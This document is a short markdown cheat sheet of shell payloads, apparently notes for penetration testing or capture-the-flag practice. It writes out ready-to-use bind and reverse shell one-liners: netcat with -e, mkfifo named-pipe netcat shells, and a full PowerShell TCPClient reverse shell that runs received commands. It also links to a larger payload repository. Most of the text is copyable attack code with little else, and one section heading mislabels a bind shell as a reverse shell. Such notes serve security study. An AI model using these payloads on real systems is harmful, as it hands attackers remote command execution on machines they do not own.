# Common Shell Payloads

#### Netcat Payloads

1. **Bind Shell with Netcat**:
   *   In some versions of Netcat (like `nc.exe` on Windows and `netcat-traditional` on Kali), you can use the `-e` option to execute a process upon connection. For example, to set up a listener:

       ```bash
       nc -lvnp <PORT> -e /bin/bash
       ```
   *   Connecting to this listener with:

       ```bash
       nc <LOCAL-IP> <PORT> -e /bin/bash
       ```

       would result in a bind shell on the target.
2. **Reverse Shell with Netcat**:
   *   However, the `-e` option is not available in most versions of Netcat due to security concerns. Instead, for a bind shell on Linux, you can use:

       {% code overflow="wrap" %}
       ```bash
       mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
       ```
       {% endcode %}
   * **Explanation**:
     * This command creates a named pipe at `/tmp/f`, starts a Netcat listener, and connects the input of the listener to the output of the named pipe. Commands sent to the listener are piped into `sh`, with stderr redirected to stdout, completing the loop.
3. **Reverse Shell Command**:
   *   A similar command for a reverse shell is:

       ```bash
       mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
       ```
   * This command is nearly identical to the bind shell command but uses the Netcat connect syntax.

#### PowerShell Reverse Shell

*   When targeting modern Windows Servers, a PowerShell reverse shell is often required. Here’s a useful one-liner:

    {% code overflow="wrap" %}
    ```powershell
    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
    {% endcode %}
* **Usage**: Replace `<IP>` and `<port>` with the appropriate values. This command can be executed in a `cmd.exe` shell or through other command execution methods (like a webshell) to establish a reverse shell.

#### Additional Resources

* For more common reverse shell payloads, check out [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), a repository that contains a wide range of shell codes, usually in one-liner format for easy copying and pasting. It's a valuable resource to explore various options available for different programming languages.
